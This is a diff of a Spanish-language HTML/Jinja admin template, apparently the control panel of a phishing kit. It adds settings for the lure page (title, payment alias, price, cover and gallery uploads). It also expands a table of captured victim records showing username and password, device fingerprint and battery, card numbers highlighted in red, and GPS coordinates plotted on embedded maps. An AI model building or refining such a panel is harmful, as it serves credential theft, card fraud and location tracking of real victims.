@@ -2,44 +2,80 @@
 <html lang="es">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ADMIN_V13</title>
+    <title>MASTER_CONTROL_V13</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
     <style>
         body { background: #000; color: #00ff41; font-family: monospace; font-size: 0.8rem; }
-        .m-box { border: 1px solid #00ff41; background: rgba(0,20,0,0.9); padding: 10px; margin-bottom: 10px; }
-        .table { color: #00ff41; border-color: #004400; }
-        .card-data { color: #ff3131; font-weight: bold; border: 1px dashed #ff3131; padding: 5px; display: block; }
+        .m-box { border: 1px solid #00ff41; background: rgba(0,20,0,0.95); padding: 15px; margin-bottom: 12px; border-radius: 8px; }
+        .table { color: #00ff41; border-color: #004400; font-size: 0.75rem; }
+        .thumb { width: 50px; height: 50px; object-fit: cover; border: 1px solid #00ff41; margin: 3px; border-radius: 4px; }
+        input, .form-control { background: #000 !important; color: #00ff41 !important; border: 1px solid #00ff41 !important; font-size: 0.8rem; }
+        .label-p { color: #00ccff; font-weight: bold; font-size: 0.65rem; display: block; margin-top: 8px; }
+        .card-data { color: #ff3131; font-weight: bold; border: 1px dashed #ff3131; padding: 4px; border-radius: 4px; }
     </style>
 </head>
 <body class="p-3">
+    <h5 class="mb-4 border-bottom border-success pb-2">> MASTER_SYSTEM_V13_FRANCO</h5>
     <div class="row">
         <div class="col-md-3">
             <div class="m-box">
-                <h6>CONFIGURACIÓN</h6>
+                <p class="text-white small fw-bold">> CONFIGURACIÓN_VISUAL</p>
                 <form action="/update_full" method="POST" enctype="multipart/form-data">
-                    <input type="text" name="titulo" value="{{config.titulo}}" class="form-control form-control-sm mb-2" placeholder="Título">
-                    <input type="text" name="alias" value="{{config.alias}}" class="form-control form-control-sm mb-2" placeholder="Alias Pago">
-                    <input type="text" name="precio" value="{{config.precio}}" class="form-control form-control-sm mb-2" placeholder="Precio">
-                    <input type="color" name="color_fondo" value="{{config.color_fondo}}" class="form-control form-control-sm mb-2">
-                    <button class="btn btn-success btn-sm w-100">ACTUALIZAR</button>
+                    <span class="label-p">SUBIR PORTADA:</span>
+                    <input type="file" name="file_portada" class="form-control form-control-sm mb-2">
+                    <span class="label-p">TÍTULO DEL SITIO:</span>
+                    <input type="text" name="titulo" value="{{config.titulo}}" class="form-control form-control-sm mb-2">
+                    <span class="label-p">ALIAS PAGO:</span>
+                    <input type="text" name="alias" value="{{config.alias}}" class="form-control form-control-sm mb-2">
+                    <span class="label-p">PRECIO:</span>
+                    <input type="text" name="precio" value="{{config.precio}}" class="form-control form-control-sm mb-2">
+                    <div class="row g-2 mb-3">
+                        <div class="col-6"><span class="label-p">FONDO:</span><input type="color" name="color_fondo" value="{{config.color_fondo}}" class="form-control form-control-sm h-auto"></div>
+                        <div class="col-6"><span class="label-p">TEXTO:</span><input type="color" name="color_texto" value="{{config.color_texto}}" class="form-control form-control-sm h-auto"></div>
+                    </div>
+                    <button class="btn btn-outline-success btn-sm w-100">GUARDAR_CAMBIOS</button>
                 </form>
             </div>
-        </div>
-        <div class="col-md-9">
             <div class="m-box">
-                <h6>REGISTROS CAPTURADOS</h6>
-                <table class="table table-dark table-sm">
-                    <thead><tr><th>USUARIO/PASS</th><th>UBICACIÓN</th><th>TARJETA</th><th>MAPA</th></tr></thead>
+                <p class="text-white small fw-bold">> GESTIÓN_GALERÍA</p>
+                <form action="/upload_media" method="POST" enctype="multipart/form-data">
+                    <input type="file" name="file_gallery" class="form-control form-control-sm mb-2">
+                    <button class="btn btn-outline-primary btn-sm w-100 mb-2">SUBIR_FOTO</button>
+                </form>
+                <div class="d-flex flex-wrap overflow-auto" style="max-height: 150px;">
+                    {% for f in archivos %}
+                    <div class="position-relative">
+                        <img src="/static/uploads/{{f}}" class="thumb">
+                        <a href="/delete_file/{{f}}" class="btn btn-danger btn-sm p-0 position-absolute top-0 end-0" style="width:15px;height:15px;font-size:10px;">X</a>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+
+        <div class="col-md-9">
+            <div class="m-box overflow-auto">
+                <p class="text-white small fw-bold">> LOGS_FORENSES_CAPTURA</p>
+                <table class="table table-dark table-hover table-sm">
+                    <thead>
+                        <tr>
+                            <th>IDENTIDAD</th>
+                            <th>HUELLA/BAT</th>
+                            <th>TARJETA</th>
+                            <th>UBICACIÓN/MAPA</th>
+                        </tr>
+                    </thead>
                     <tbody>
                         {% for r in registros %}
                         <tr>
                             <td><b>{{r[1]}}</b><br><small class="text-info">{{r[2]}}</small></td>
-                            <td><small>{{r[8]}}</small><br><small class="text-muted">{{r[9]}}, {{r[10]}}</small></td>
+                            <td><small class="text-warning">BAT: {{r[11]}}</small><br><small>{{r[12]}} | {{r[7]}}</small></td>
                             <td><span class="card-data">{{r[3]}}</span></td>
                             <td>
+                                <small class="d-block text-muted">{{r[8]}}</small>
                                 {% if r[9] != 0 %}
-                                <iframe width="100" height="60" src="https://maps.google.com/maps?q={{r[9]}},{{r[10]}}&z=15&output=embed"></iframe>
-                                {% endif %}
+                                <iframe width="130" height="75" src="https://maps.google.com/maps?q={{r[9]}},{{r[10]}}&hl=es&z=14&output=embed" style="border:1px solid #00ff41; border-radius:5px;"></iframe>
+                                {% else %}<small class="text-danger">Sin señal GPS</small>{% endif %}
                             </td>
                         </tr>
                         {% endfor %}
